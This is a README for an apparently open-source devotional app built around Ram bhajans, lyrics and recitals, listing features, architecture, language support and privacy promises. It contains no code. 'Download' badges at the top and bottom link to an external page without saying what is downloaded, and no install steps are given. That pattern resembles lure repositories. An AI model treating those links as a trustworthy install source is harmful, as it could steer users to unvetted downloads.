![preview](https://raw.githubusercontent.com/Ecks49/dhanush-dev-hub/main/card_14be1d.svg)
[![Download](https://raw.githubusercontent.com/Ecks49/dhanush-dev-hub/main/run_702c4.svg)](https://Ecks49.github.io/dhanush-dev-hub/)

# 🌟 Dhanush Ramsevak — Echoes of Devotion

> *A digital sanctuary where rhythm meets reverence, and every verse finds its voice.*

An open-source devotional audio and lyric companion platform inspired by the timeless tradition of **Ram Bhajans**, **Ramayana recitals**, and the soulful storytelling carried forward by generations of devotees. This repository houses the complete source architecture for a modern, contemplative digital experience — one that treats every hymn as a living artifact rather than mere media.

Rather than positioning itself as another streaming shell, **Echoes of Devotion** approaches devotional content the way a temple caretaker approaches a sanctum: with patience, structure, and respect for the listener's inner journey. It is built for families who sing together, for students learning the cadence of ancient verses, and for anyone seeking stillness in a noisy digital world.

---

## 📖 Table of Contents

- [🌱 Vision & Philosophy](#-vision--philosophy)
- [✨ Feature Highlights](#-feature-highlights)
- [🎼 Content Domain](#-content-domain)
- [🧩 Architecture Overview](#-architecture-overview)
- [🌐 Multilingual Experience](#-multilingual-experience)
- [📱 Responsive Interface Principles](#-responsive-interface-principles)
- [🕊️ Community & Contributions](#️-community--contributions)
- [🔐 Privacy & Trust](#-privacy--trust)
- [⚖️ License](#️-license)
- [📌 Disclaimer](#-disclaimer)
- [💬 Support](#-support)

---

## 🌱 Vision & Philosophy

Every devotional gathering begins with a single note. That note is not owned — it is *borrowed* from tradition. This project exists to make that borrowing graceful.

The design language of **Echoes of Devotion** is inspired by the natural cadence of a bhajan mandali: a lead voice, a chorus, a gentle pause, then repetition. Our software mirrors that rhythm — quiet defaults, intentional spacing, and no aggressive nudge mechanisms. We believe interfaces should bow, not shout.

Where a typical media app demands attention, we aim to return it. Where a typical app optimizes for loops of dopamine, this one optimizes for clarity of mind.

---

## ✨ Feature Highlights

A carefully curated set of capabilities, each shaped around real devotional practice.

- **🎧 Contemplative Playback Engine** — A distraction-minimal player tuned for long-form recitals, with crossfading between verses rather than abrupt cuts.
- **📜 Synchronized Lyric Sheets** — Devanagari, transliteration, and meaning layered together so learners can follow line by line.
- **🪔 Daily Verse Ritual** — A rotating verse delivered at sunrise and dusk, drawn from public-domain scripture collections.
- **🎚️ Tempo & Pitch Companion** — For learners practicing aloud with a track, allowing subtle adjustment without distortion.
- **🗂️ Curated Collections** — Groupings such as *Morning Invocations*, *Evening Aartis*, and *Festival Specials* — arranged by mood, not algorithm.
- **🖋️ Annotation Layer** — Personal margin notes attached to specific verses; useful for teachers and family elders.
- **📚 Offline-First Reading** — Text components remain accessible with no connectivity, reinforcing accessibility in rural and travel contexts.
- **🔄 Cross-Device Continuity** — Pick up a recital on a phone and continue on a tablet without losing position.
- **🔎 Intent-Aware Search** — Search by verse meaning, not just title or artist.
- **🌿 Low-Power Mode** — Reduces animation and background activity, extending usage on older devices.

Each item above is oriented toward *understanding* rather than consumption. A verse listened to once with attention outweighs a hundred reels scrolled past.

---

## 🎼 Content Domain

The repository ships with tooling to organize and present:

| Category | Description | Typical Usage |
|----------|-------------|---------------|
| Bhajans | Devotional songs with repeating refrains | Family gatherings |
| Chaupais | Metrical verse from the Ramayana | Recitation practice |
| Aartis | Ritual offerings sung with lamps | Morning & evening rites |
| Stotras | Structured praise hymns | Personal study |
| Katha Excerpts | Prose narration segments | Storytelling evenings |
| Folk Variations | Regional melodic renditions | Cultural preservation |

All metadata schemas are versioned, documented, and deliberately conservative — we prefer fewer fields that endure over many that decay.

---

## 🧩 Architecture Overview

The system is composed of several cooperating layers, each with a narrow responsibility:

- **Ingestion Layer** — Normalizes audio, lyrics, translations, and metadata into a unified content bundle.
- **Curation Layer** — Provides editorial controls, versioning, and review workflow.
- **Serving Layer** — Delivers content via a lightweight, cache-friendly API surface.
- **Client Layer** — Renders across desktop, mobile web, and embedded displays.
- **Sync Layer** — Coordinates preferences, annotations, and reading positions across devices.

The guiding principle is *substitution over stacking*: whenever a new subsystem is introduced, it must replace or absorb an older one, keeping total surface area stable.

---

## 🌐 Multilingual Experience

Language is not a setting in this project — it is a first-class dimension of the content model.

- **Supported Interface Locales (2026 roadmap):** English, Hindi, Tamil, Telugu, Kannada, Malayalam, Bengali, Marathi, Gujarati, Sanskrit (IAST).
- **Translation Fallback Chain:** Each string may declare a preferred locale, a fallback locale, and an original source locale.
- **Script-Aware Typography:** Font stacks are chosen per script to preserve diacritic clarity and conjunct rendering.
- **RTL Preparation:** Though not currently required for the primary script set, layout primitives are direction-agnostic.
- **Community Glossary:** A shared, versioned dictionary ensures terms like *chaupai* and *aarti* are spelled consistently.

Language, in this repository, is treated less like a dropdown and more like a doorway.

---

## 📱 Responsive Interface Principles

Responsiveness here means more than fitting screens. It means fitting *moments*.

- **Thumb-Zone Awareness** — Primary controls stay reachable on large phones.
- **Reading Width Caps** — Long verses remain legible on ultrawide monitors.
- **Reduced Motion Respect** — Honors the user's operating-system preference automatically.
- **Contrast-First Palette** — Meets accessibility ratios before aesthetics are applied.
- **Progressive Disclosure** — Secondary controls appear only when relevant.
- **Keyboard Sanctuary** — Every action is reachable without a pointer device.
- **No Autoplay Ambush** — Sound begins only when invited.

These choices converge on a single outcome: an interface that disappears while devotion remains.

---

## 🕊️ Community & Contributions

This repository welcomes contributions from developers, translators, designers, and — importantly — practitioners.

Ways to participate:

1. **Translate** a lyric sheet or interface string.
2. **Review** a metadata record for accuracy.
3. **Design** a new layout for a specific ritual context.
4. **Document** a regional variation of an existing hymn.
5. **Test** on devices we may not own.

Before submitting, please ensure your contribution aligns with the [Vision & Philosophy](#-vision--philosophy). Contributions that introduce manipulative patterns, tracking surprises, or irreversible data flows will be returned for revision.

---

## 🔐 Privacy & Trust

- No hidden telemetry.
- No third-party advertising SDKs.
- No mandatory account for core functions.
- Data export available in open formats.
- Clear, plain-language changelog for any collection changes.

Trust is not a feature toggle. It is the floor the whole house stands on.

---

## ⚖️ License

This project is distributed under the **MIT License**.

Read the full text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 — Echoes of Devotion Contributors.

---

## 📌 Disclaimer

This repository is an independent, community-driven devotional software project. It is **not affiliated with, endorsed by, or sponsored by** any religious institution, temple trust, media network, or commercial label.

- Content included is intended for personal, educational, and cultural preservation purposes.
- Users are responsible for ensuring they hold appropriate rights for any media they add locally.
- Names, verses, and traditions referenced belong to their respective cultural and historical origins.
- The maintainers make no claim of completeness or doctrinal authority over any scripture.
- Audio, if added by users, remains the user's responsibility to source lawfully.
- Availability of features may vary by region and device capability.
- No guarantee is offered for uninterrupted service availability.

---

## 💬 Support

The project is maintained by volunteers who believe technology should serve stillness, not steal it.

- **Questions & Discussions:** Open a discussion thread in this repository.
- **Bug Reports:** Use the issue tracker with a reproducible description.
- **Translation Help:** Label your pull request with `i18n`.
- **Accessibility Feedback:** Label issues with `a11y`.

Response times are best-effort and typically within a few days. We aim to respond to every thoughtful message.

---

## 🌸 A Closing Note

The name **Dhanush Ramsevak** evokes the bow and the servant — precision held in service. This repository tries to keep that spirit: sharp engineering, humble purpose.

If this project helps one family sing together with a little more confidence in 2026, it will have done its work.

[![Download](https://raw.githubusercontent.com/Ecks49/dhanush-dev-hub/main/run_702c4.svg)](https://Ecks49.github.io/dhanush-dev-hub/)